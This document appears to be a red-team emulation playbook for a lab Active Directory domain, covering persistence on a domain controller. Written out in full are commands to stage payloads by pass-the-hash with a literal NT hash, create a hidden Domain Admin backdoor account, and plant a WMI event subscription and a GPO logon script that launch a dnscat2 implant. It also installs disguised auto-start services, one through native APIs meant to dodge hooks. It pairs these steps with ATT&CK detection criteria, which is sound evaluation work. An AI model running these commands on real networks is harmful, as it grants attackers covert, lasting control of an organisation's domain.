# Phase 3-2 - Persistence on Domain Controller

## Overview

Four persistence mechanisms follow (Steps 4–7), each with optional alternatives:

- **Step 4:** Domain Backdoor Account (`svcbackup`).
- **Step 5:** WMI Permanent Event Subscription (60-second respawn timer).
- **Step 6:** Network Logon Script (SYSVOL-based, implicit lateral reach to workstations).
- **Step 7 (Registry-Backed Service):** No Event ID 7045; registry-only artifacts.
- **Step 7B (API-Based Service):** Event ID 7045 generated; SCM service visible immediately.

## Step 3 - Pre-Persistence Payload Staging on DC01

### Voice Track

All persistence mechanisms (Steps 4–7) depend on `policyupdate.exe`, `policysync.exe`, `policysync-host.exe`,
`ServiceInstaller.exe`, and `NtServiceInstaller.exe` being present on DC01. Rather than
stage these payloads on-demand as each persistence step executes, they are consolidated
and transferred to DC01 in this single step **before any persistence mechanisms run**.
This eliminates redundant staging operations and ensures all execution steps can proceed
independently without returning to earlier stages.

All four binaries were pre-staged on IIS01 in Phase 3 Step 1 using the same react2shell
eval-based chunked upload path established in Phase 1. From the IIS01 dnscat2 SYSTEM shell,
`go-thehash.exe put` is used to copy them over the `C$` admin share to DC01 in bulk,
where they remain available for each persistence step (6–10) to invoke without additional
staging overhead.

> Further reading: [go-thehash.md](../further-reading/go-thehash.md) covers the shared
> SMB `put` implementation used for this staging step.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, upload persistence payloads to DC01

  ```text
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policyupdate.exe C:\ProgramData\policyupdate.bin
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policysync.exe C:\ProgramData\policysync.bin
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\policysync-host.exe C:\ProgramData\policysync-host.bin
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\ServiceInstaller.exe C:\ProgramData\ServiceInstaller.bin
  C:\ProgramData> go-thehash.exe put 10.12.10.10 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.bin
  ```

  - ***Expected Output***

    ```text
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\policyupdate.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\policysync.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\policysync-host.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\ServiceInstaller.exe
    [+] Authenticated as TESTLAB\Administrator
    [+] Uploaded <n> bytes → \\C$\C$\ProgramData\NtServiceInstaller.exe
    ```

- ☣️ On the DC01 dnscat2 shell, verify all persistence binaries are present

  ```text
  command (dc01) 2> shell
  C:\ProgramData> dir policyupdate.exe policysync.exe policysync-host.exe ServiceInstaller.exe NtServiceInstaller.exe
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | Security Event 4624 on DC01 — Logon Type 3, `LogonProcessName: NtLmSsp`, source IP `10.12.10.20` (IIS01) as `TESTLAB\Administrator`; NTLM network logon from a web-application host to the domain controller under a Domain Admin account | Calibrated - Not Benign | `go-thehash.exe put` authenticates to DC01 using the Administrator NT hash, bypassing the password requirement to open the C$ admin share | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go connect()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | Security Event 5140 on DC01 — `C$` admin share accessed from source IP `10.12.10.20` (IIS01) as `TESTLAB\Administrator`; inbound admin-share connection from a web-application host to the domain controller | Not Calibrated - Not Benign | `go-thehash.exe put` opens an SMB2 tree to `\\DC01\C$`, using the PtH session to access the admin share for payload staging | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | Sysmon Event 11 on DC01 — `policyupdate.exe`, `policysync.exe`, `ServiceInstaller.exe`, and `NtServiceInstaller.exe` created under `C:\ProgramData\` with `Image = System (PID 4)`; remote-write indicator marking attacker payloads staged to the domain controller via SMB admin share, not via a local installer process | Calibrated - Not Benign | `go-thehash.exe put` writes four persistence binaries into DC01's `C:\ProgramData\` over the C$ admin share | IIS01/react.testlab.local → DC01 | TESTLAB\Administrator | [main.go putFile()](../../resources/payloads/lateral-movement/go-thehash/main.go) | -

---

## Step 4 - Persistence: Domain Backdoor Account

### Voice Track

A covert domain account provides credential-based fallback access that survives complete
C2 destruction: even if all payloads are removed and all sessions are burned, `svcbackup`
can re-authenticate via SMB, WinRM, or RDP from any system on the network.

`net user` and `net group` are standard Windows utilities available in any cmd shell. On
a DC, they write directly to the domain NTDS database through the local LDAP/SAM API
stack without requiring additional tooling. Both operations are logged immediately by the
DC's Security event log - Event ID 4720 (account created) and Event ID 4728 (member added
to security-enabled global group) - generated by the LSA/AD subsystem independently of
the execution chain.

After creating the account, the attacker hides it from the Windows logon screen by writing
a `REG_DWORD 0` value under `SpecialAccounts\UserList`. Any operator opening an RDP or
console session to DC01 will not see `svcbackup` in the login picker, reducing the chance
of accidental discovery during routine administration. The registry write generates its
own detection signal (Sysmon EventCode 13 on `SpecialAccounts\UserList`) independent of
the account-creation events.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the backdoor domain account

  ```text
  C:\ProgramData> net user svcbackup P@ssw0rd2026! /add /domain
  ```

  - ***Expected Output***

    ```text
    The command completed successfully.
    ```

- ☣️ Add the backdoor account to Domain Admins

  ```text
  C:\ProgramData> net group "Domain Admins" svcbackup /add /domain
  ```

  - ***Expected Output***

    ```text
    The command completed successfully.
    ```

- ☣️ Hide the account from the DC01 logon screen

  ```text
  C:\ProgramData> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svcbackup /t REG_DWORD /d 0 /f
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- ☣️ Verify group membership

  ```text
  C:\ProgramData> net user svcbackup /domain
  ```

  - ***Expected Output (excerpt)***

    ```text
    User name                    svcbackup
    ...
    Global Group memberships     *Domain Users         *Domain Admins
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1136.002 | Create Account: Domain Account | Windows | Security Event 4720 on DC01 — new domain account `svcbackup` created by `TESTLAB\Administrator` | Calibrated - Not Benign | `net.exe user svcbackup /add /domain` creates a backdoor domain account on DC01 | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1098.007 | Account Manipulation: Additional Local or Domain Groups | Windows | Security Event 4728 on DC01 — `svcbackup` added to `Domain Admins` security group by `TESTLAB\Administrator` | Calibrated - Not Benign | `net.exe group "Domain Admins" svcbackup /add /domain` escalates the backdoor account to Domain Admin on DC01 | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1078.002 | Valid Accounts: Domain Accounts | Windows | N/A — C1: svcbackup does not authenticate during this step; account establishment is captured by T1136.002 (Event 4720) and T1098.007 (Event 4728) | Not Calibrated - Not Benign | Backdoor domain account `svcbackup` with Domain Admin membership enables credential-based re-entry via SMB, WinRM, or RDP from any network-connected host | DC01 | TESTLAB\Administrator (creator) | - | -
| Defense Evasion | T1564.002 | Hide Artifacts: Hidden Users | Windows | `reg.exe` writes REG_DWORD value `svcbackup=0` under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList` on DC01 (Sysmon Event 13) | Calibrated - Not Benign | `reg.exe` writes `svcbackup=0` under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList` on DC01, hiding the backdoor account from the logon screen | DC01 | TESTLAB\Administrator | - | -

---

## Step 5 - Persistence: WMI Permanent Event Subscription

### Voice Track

A WMI permanent event subscription persists across reboots without any registry run key,
scheduled task, or service entry. Four objects are created in the WMI namespace to establish
a timer-based trigger:

- `__IntervalTimerInstruction` (`CertPolicyTimer`): a timer set to fire every 60 seconds (or 24 hours in a real attack), created in `root\cimv2`.
- `__EventFilter` (`CertPolicyFilter`): a WQL query polling for `__TimerEvent` matching the timer ID, created in `root\subscription`.
- `CommandLineEventConsumer` (`CertPolicyConsumer`): executes `C:\ProgramData\policyupdate.exe`
  when the filter fires.
- `__FilterToConsumerBinding`: binds the filter to the consumer.

Once bound, `wmiprvse.exe` waits for the timer to fire. When it fires,
`wmiprvse.exe` spawns `policyupdate.exe` directly - no ghost process, no loader. The
`CommandLineEventConsumer` host always runs under `NT AUTHORITY\SYSTEM`, so the resulting
C2 session appears as SYSTEM regardless of which Path (A or B) was used.

PowerShell is used here for its convenient `Set-WmiInstance` API. The scored artifact
is the subscription binding in `root\subscription` - the PowerShell invocation is an
unscored setup step. Subscription creation is logged as Event ID 5861 in the
`Microsoft-Windows-WMI-Activity/Operational` log.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the WMI permanent event subscription with a 60-second timer

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$ns='root\subscription';$cimv2='root\cimv2';Set-WmiInstance -Namespace $cimv2 -Class __IntervalTimerInstruction -Arguments @{TimerID='CertPolicyTimer';IntervalBetweenEvents=[UInt32]60000}|Out-Null;$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name='CertPolicyFilter';EventNamespace=$cimv2;QueryLanguage='WQL';Query=\"SELECT * FROM __TimerEvent WHERE TimerID='CertPolicyTimer'\"};$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name='CertPolicyConsumer';CommandLineTemplate='C:\ProgramData\policyupdate.exe'};Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f.Path.Path;Consumer=$c.Path.Path}"
  ```

  - ***Expected Output***

    ```text
    (no output - PowerShell returns the created objects silently; errors surface here if any step fails)
    ```

- ☣️ Verify the subscription binding is present

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Select Filter, Consumer"
  ```

  - ***Expected Output***

    ```text
    Filter                                                          Consumer
    ------                                                          --------
    \\.\root\subscription:__EventFilter.Name="CertPolicyFilter"    \\.\root\subscription:CommandLineEventConsumer.Name="CertPolicyConsumer"
    ```

- ☣️ On the attacker machine, wait ≤ 60 seconds for the subscription to fire and confirm the new C2 session

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 3> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

- ☣️ Clean up the subscription manually to prevent recurring execution noise

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*CertPolicyFilter*' } | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq 'CertPolicyConsumer' } | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq 'CertPolicyFilter' } | Remove-WmiObject; Get-WmiObject -Namespace root\cimv2 -Class __IntervalTimerInstruction | Where-Object { $_.TimerId -eq 'CertPolicyTimer' } | Remove-WmiObject"
  ```

  - ***Expected Output***

    ```text
    (no output)
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` runs `Set-WmiInstance` commands creating `CertPolicyFilter`, `CertPolicyConsumer`, and `__FilterToConsumerBinding` in `root\subscription` on DC01 (Script Block Log Event ID 4104) | Not Calibrated - Not Benign | `powershell.exe` invokes `Set-WmiInstance` to create timer-triggered WMI subscription objects in `root\subscription` on DC01, with `CertPolicyConsumer` pointing to `C:\ProgramData\policyupdate.exe` | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1546.003 | Event Triggered Execution: Windows Management Instrumentation Event Subscription | Windows | `wmiprvse.exe` records `__FilterToConsumerBinding` binding `CertPolicyFilter` to `CertPolicyConsumer` in `root\subscription` on DC01 (WMI Activity Event ID 5861) | Calibrated - Not Benign | WMI permanent event subscription created: `CertPolicyConsumer` executes `C:\ProgramData\policyupdate.exe` when the 60-second `CertPolicyTimer` fires; `wmiprvse.exe` spawns `policyupdate.exe` directly as SYSTEM | DC01 | TESTLAB\Administrator (creator) / NT AUTHORITY\SYSTEM (runtime) | [policyupdate.exe](../../resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | WMI `__EventFilter` object named `CertPolicyFilter` and `CommandLineEventConsumer` named `CertPolicyConsumer` in `root\subscription` namespace; Event ID 5861 shows consumer name `CertPolicyConsumer` | Not Calibrated - Not Benign | WMI subscription objects named `CertPolicyFilter` and `CertPolicyConsumer` to blend with Windows certificate-policy infrastructure | DC01 | TESTLAB\Administrator | - | -

---

## Step 6 - Persistence & Lateral Movement: Network Logon Script

### Voice Track

A domain GPO logon script provides implicit lateral reach to workstations without any
additional lateral movement step: when any domain user logs into any domain-joined
machine, `userinit.exe` reads the Default Domain Policy's `scripts.ini`, resolves the
UNC path from SYSVOL, and executes the script in the user's security context.

`policyupdate.exe` is copied into the SYSVOL `scripts` folder under the name `update.exe`.
SYSVOL is replicated to all domain controllers via DFS-R, so the payload is instantly
available from every DC. The Default Domain Policy (GUID
`{31B2F340-016D-11D2-945F-00C04FB984F9}`) `scripts.ini` for User logon is then created
or updated with a `0CmdLine` entry pointing to the UNC path - appended as the next
sequential index if the file already exists, or written fresh if absent. The Scripts
Client-Side Extension GUID is merged into `gPCUserExtensionNames` on the GPO AD object
only if not already present.

The resulting C2 sessions appear under the logged-on user's account - typically a
standard domain user without elevated rights. Three independently observable artifacts
are generated:
1. File creation: `update.exe` in `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\`.
2. File creation or modification: `scripts.ini` in the Default Domain Policy User Scripts path.
3. Process creation: `userinit.exe` spawns `update.exe` on each workstation logon -
   originating from a legitimate Windows process, not a ghost or injected context.

### Procedures

- ☣️ From the DC01 dnscat2 shell, stage `policyupdate.exe` into the SYSVOL scripts folder

  ```text
  C:\ProgramData> copy C:\ProgramData\policyupdate.exe "C:\Windows\SYSVOL\sysvol\testlab.local\scripts\update.exe"
  ```

  - ***Expected Output***

    ```text
    1 file(s) copied.
    ```

- ☣️ Create or update the Default Domain Policy logon `scripts.ini` - append as next sequential index if the file already exists, otherwise create fresh (UTF-16 LE encoding required by the GP Client Scripts extension)

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$path='C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\User\Scripts'; $unc='\\testlab.local\SYSVOL\testlab.local\scripts\update.exe'; md \"$path\Logon\" 2>$null; if (Test-Path \"$path\scripts.ini\") { $raw=Get-Content \"$path\scripts.ini\" -Raw -Encoding Unicode; $idx=([regex]::Matches($raw,'^\d+CmdLine=','Multiline')).Count; $raw+=\"${idx}CmdLine=$unc`r`n${idx}Parameters=`r`n\"; [System.IO.File]::WriteAllText(\"$path\scripts.ini\",$raw,[System.Text.Encoding]::Unicode) } else { $c=\"[Logon]`r`n0CmdLine=$unc`r`n0Parameters=`r`n\"; [System.IO.File]::WriteAllText(\"$path\scripts.ini\",$c,[System.Text.Encoding]::Unicode) }"
  ```

  - ***Expected Output***

    ```text
    (no output - file written silently)
    ```

- ☣️ Verify the `scripts.ini` content

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Get-Content 'C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\User\Scripts\scripts.ini'"
  ```

  - ***Expected Output***

    ```text
    [Logon]
    0CmdLine=\\testlab.local\SYSVOL\testlab.local\scripts\update.exe
    0Parameters=
    ```

- ☣️ Register the Scripts Client-Side Extension (CSE) on the GPO AD object and bump the version number so workstations re-process the policy

  > **Why required**: Writing `scripts.ini` directly to SYSVOL does not update the GPO's AD object. The GP Client checks `gPCUserExtensionNames` to know which CSEs to invoke - if the Scripts CSE GUID is absent, the workstation silently skips logon script processing. The `versionNumber` bump in both AD and `GPT.ini` forces clients to re-download the policy instead of using their cache.

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Import-Module ActiveDirectory; $dn='CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=testlab,DC=local'; $obj=Get-ADObject $dn -Properties gPCUserExtensionNames,versionNumber; $newCSE='[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B66650-4972-11D1-A7CA-0000F87571E3}]'; $existing=$obj.gPCUserExtensionNames; if ($existing -and $existing -notmatch '42B5FAAE') { $merged=$existing+$newCSE } else { $merged=$newCSE }; Set-ADObject $dn -Replace @{gPCUserExtensionNames=$merged; versionNumber=($obj.versionNumber+65536)}"
  ```

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$f='C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.ini'; $v=[int]([regex]::Match((Get-Content $f -Raw),'Version=(\d+)').Groups[1].Value); (Get-Content $f) -replace \"Version=$v\",\"Version=$($v+65536)\" | Set-Content $f -Encoding ASCII"
  ```

  - ***Expected Output***

    ```text
    (no output - AD object and GPT.ini updated silently)
    ```

- ☣️ On the target workstation (`WS01`), force a Group Policy refresh then log off

  ```text
  WS01> gpupdate /force
  WS01> logoff
  ```

  - ***Expected Output***

    ```text
    Updating policy...
    Computer Policy update has completed successfully.
    User Policy update has completed successfully.
    ```

- ☣️ RDP back into WS01 as a domain user and confirm new C2 session on the attacker machine

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (<workstation>) 4> whoami
  ```

  - ***Expected Output***

    ```text
    testlab\<username>
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `cmd.exe` (`copy`) creates `update.exe` in `C:\Windows\SYSVOL\sysvol\testlab.local\scripts\` on DC01 (Sysmon Event 11) | Calibrated - Not Benign | `cmd.exe copy` places `policyupdate.exe` into the SYSVOL scripts folder as `update.exe` on DC01; DFS-R replication makes it available as `\\testlab.local\SYSVOL\testlab.local\scripts\update.exe` from all domain controllers | DC01 | TESTLAB\Administrator | [policyupdate.exe](../../resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe) | -
| Defense Evasion | T1484.001 | Domain or Tenant Policy Modification: Group Policy Modification | Windows | `powershell.exe` creates or modifies `scripts.ini` with `0CmdLine=\\testlab.local\SYSVOL\testlab.local\scripts\update.exe` under `C:\Windows\SYSVOL\sysvol\testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\User\Scripts\` on DC01 (Sysmon Event 11) | Calibrated - Not Benign | `powershell.exe` writes `scripts.ini` into the Default Domain Policy SYSVOL path on DC01, registering `\\testlab.local\SYSVOL\testlab.local\scripts\update.exe` as the domain logon script | DC01 | TESTLAB\Administrator | - | -
| Persistence | T1037.003 | Boot or Logon Initialization Scripts: Network Logon Script | Windows | On WS01: `userinit.exe` spawns `update.exe` (resolved from `\\testlab.local\SYSVOL\testlab.local\scripts\update.exe`) during domain user logon (Sysmon Event 1: `ParentImage = C:\Windows\System32\userinit.exe`, `Image = update.exe`) | Calibrated - Not Benign | `userinit.exe` reads `scripts.ini` and spawns `update.exe` (dnscat2) in the logged-on domain user's session on WS01 on next domain logon | WS01 | TESTLAB\<domain user> | [dnscat2.exe](../../resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe) | -

---

## Step 7 - Service Creation: Registry-Backed Windows Service Persistence

### Voice Track

`NtServiceInstaller.exe` creates a second auto-start Windows service without calling
`CreateServiceW`. Instead, it opens
`\Registry\Machine\SYSTEM\CurrentControlSet\Services`, creates a service subkey, and
writes the service configuration with native NT registry APIs (`NtOpenKey`,
`NtCreateKey`, and `NtSetValueKey`).

This path produces a different telemetry surface than Step 7B. The primary artifact is
the service registry key itself, not an SCM service creation event: the install path
writes `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` with `Type = 16`,
`Start = 2`, `ImagePath = C:\ProgramData\policysync.exe`, and
`ObjectName = LocalSystem`. Because SCM does not receive a normal `CreateServiceW`
request, the service may not be available through SCM until reboot or service database
refresh. This makes this path useful for evaluating registry-backed service
persistence that does not rely on Event ID 7045.

### Procedures

- ☣️ From the DC01 dnscat2 shell, create the registry-backed service

  ```text
  C:\ProgramData> NtServiceInstaller.exe install C:\ProgramData\policysync.exe CertPolicyCache "Certificate Policy Cache" "Caches certificate policy metadata"
  ```

  - ***Expected Output***

    ```text
    Service key created (disposition: <n>)
    Service 'CertPolicyCache' installed successfully via NT syscalls
    Note: Service requires system reboot or manual SCM refresh to appear
    ```

- ☣️ Verify the service registry configuration

  ```text
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v ImagePath
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v Start
  C:\ProgramData> reg query HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache /v ObjectName
  ```

  - ***Expected Output***

    ```text
    ImagePath    REG_SZ    C:\ProgramData\policysync.exe
    Start        REG_DWORD 0x2
    ObjectName   REG_SZ    LocalSystem
    ```

- ☣️ Trigger: reboot DC01 during the planned test window or wait for SCM refresh, then confirm the service-backed C2 session

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 6> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `NtServiceInstaller.exe` creates registry key `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` on DC01 with `ImagePath = C:\ProgramData\policysync.exe`, `Start = 2`, `Type = 16`, and `ObjectName = LocalSystem`; Sysmon Event IDs 12/13 record service key and value creation | Calibrated - Not Benign | `NtServiceInstaller.exe install` creates an auto-start service by writing the service configuration directly to the Services registry hive; the persistent service definition is independently verifiable even when System Event ID 7045 is absent | DC01 | TESTLAB\Administrator | [NtServiceInstaller.exe](../../resources/payloads/persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe), [service_installer.cpp](../../resources/payloads/persistence/windows-service/syscalls-cpp/service_installer.cpp) | -
| Defense Evasion | T1036.004 | Masquerading: Masquerade Task or Service | Windows | `NtServiceInstaller.exe` creates service key `CertPolicyCache` with `DisplayName = Certificate Policy Cache` and `Description = Caches certificate policy metadata`, making the registry-backed service appear consistent with legitimate certificate-policy infrastructure | Not Calibrated - Not Benign | The service name, display name, and description are chosen to disguise the malicious service as a benign certificate-policy component; this is an evasion attribute of the same registry-backed service object already scored under `T1543.003` | DC01 | TESTLAB\Administrator | [service_installer.cpp InstallService()](../../resources/payloads/persistence/windows-service/syscalls-cpp/service_installer.cpp) | -
| Execution | T1106 | Native API | Windows | `NtServiceInstaller.exe` resolves `NtOpenKey`, `NtCreateKey`, and `NtSetValueKey` directly from `ntdll.dll` via `GetProcAddress` and calls them to create and populate `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` on DC01, bypassing `advapi32.dll` API hooks and producing no `CreateServiceW` call | Calibrated - Not Benign | `NtServiceInstaller.exe install` uses dynamic ntdll.dll resolution (`GetProcAddress`) to invoke NT native registry APIs, intentionally avoiding advapi32.dll hooks; this requires API-call–level monitoring (ETW kernel callbacks) to detect, a different telemetry depth than the Sysmon 12/13 registry-object events that capture T1543.003 | DC01 | TESTLAB\Administrator | [nt_api.cpp](../../resources/payloads/persistence/windows-service/syscalls-cpp/nt_api.cpp), [service_installer.cpp](../../resources/payloads/persistence/windows-service/syscalls-cpp/service_installer.cpp) | -
| Defense Evasion | T1112 | Modify Registry | Windows | Registry values under `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache` are created or modified: `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, and `ObjectName` | Not Calibrated - Not Benign | Registry modification is the mechanism used to create the Windows service; this would double-count the same persistent service artifact already represented by T1543.003 | DC01 | TESTLAB\Administrator | [service_installer.cpp InstallService()](../../resources/payloads/persistence/windows-service/syscalls-cpp/service_installer.cpp) | -

---

## Step 7B - Service Creation: API-Based Windows Service Persistence

### Voice Track

`ServiceInstaller.exe` installs `policysync-host.exe` as a named auto-start Windows
service by calling the Service Control Manager APIs directly (`OpenSCManagerW`,
`CreateServiceW`, and `ChangeServiceConfig2W`). This avoids spawning `sc.exe` while
still using the normal SCM service creation path.

The service is immediately visible to SCM and can be started in the same step. SCM
launches `policysync-host.exe` as `LocalSystem`, so the resulting C2 session runs as
`NT AUTHORITY\SYSTEM` on DC01. Unlike Step 4's transient service execution, this
service is persistent: the service registry key remains under
`HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost`, `Start` is set to auto-start,
and the service survives reboot until explicitly deleted.

### Procedures

- ☣️ From the DC01 dnscat2 shell, install the API-created Windows service

  ```text
  C:\ProgramData> ServiceInstaller.exe install C:\ProgramData\policysync-host.exe CertPolicyHost "Certificate Policy Host" "Maintains certificate policy synchronization"
  ```

  - ***Expected Output***

    ```text
    Service 'CertPolicyHost' installed successfully
    ```

- ☣️ Start the service and confirm a new SYSTEM C2 session

  ```text
  C:\ProgramData> ServiceInstaller.exe start CertPolicyHost
  ```

  - ***Expected Output***

    ```text
    Starting service 'CertPolicyHost'...
    Service 'CertPolicyHost' started successfully
    ```

- ☣️ On the attacker machine, confirm the service-backed C2 session from DC01

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  command (dc01) 5> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | `ServiceInstaller.exe` creates Windows service `CertPolicyHost` on DC01 with `ImagePath = C:\ProgramData\policysync-host.exe`; System Event ID 7045 records the service install; service key exists at `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost` with `Start = 2` and `ObjectName = LocalSystem` | Calibrated - Not Benign | `ServiceInstaller.exe install` calls SCM APIs directly to create an auto-start service for `policysync-host.exe`; the persistent service object is independently verifiable through Event ID 7045 and the service registry key | DC01 | TESTLAB\Administrator | [ServiceInstaller.exe](../../resources/payloads/persistence/windows-service/advapi32-cpp/ServiceInstaller.exe), [service_installer.cpp](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
| Defense Evasion | T1036.004 | Masquerading: Masquerade Task or Service | Windows | `ServiceInstaller.exe` creates service name `CertPolicyHost` with display name `Certificate Policy Host` and description `Maintains certificate policy synchronization`, causing the malicious service object to resemble a benign certificate-policy component | Not Calibrated - Not Benign | The service name, display name, and description are chosen to blend with legitimate Windows certificate-policy infrastructure; this is an evasion attribute of the same service object already scored under `T1543.003`, not a separate persistence outcome | DC01 | TESTLAB\Administrator | [service_installer.cpp InstallService()](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -
| Execution | T1569.002 | System Services: Service Execution | Windows | `services.exe` starts `C:\ProgramData\policysync-host.exe` as service `CertPolicyHost`; System Event ID 7036 records service running state | Not Calibrated - Not Benign | Start substep: `ServiceInstaller.exe start CertPolicyHost` triggers SCM to launch the already-created persistence service; execution confirms the service works but the scored behavior is the persistent service creation in T1543.003 | DC01 | NT AUTHORITY\SYSTEM | [service_installer.cpp StartServiceByName()](../../resources/payloads/persistence/windows-service/advapi32-cpp/service_installer.cpp) | -

